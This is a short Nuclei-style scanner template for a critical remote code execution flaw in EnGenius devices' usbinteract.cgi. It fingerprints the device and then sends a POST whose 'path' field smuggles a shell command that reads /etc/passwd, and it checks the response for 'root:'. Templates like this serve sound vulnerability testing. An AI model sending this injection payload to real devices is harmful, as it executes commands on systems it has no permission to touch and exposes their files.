id: engenius-usbinteract-cgi-rce
info:
  name: EnGenius usbinteract.cgi Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "/web/images/guest.png"
          - "/web/images/admin.png"
  - method: POST
    path:
      - "{{BaseURL}}/web/cgi-bin/usbinteract.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "action=7&path=\"|cat /etc/passwd||\""
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "root:"
          - "/bin"
      - type: word
        negative: true
        words:
          - "<"
        part: body
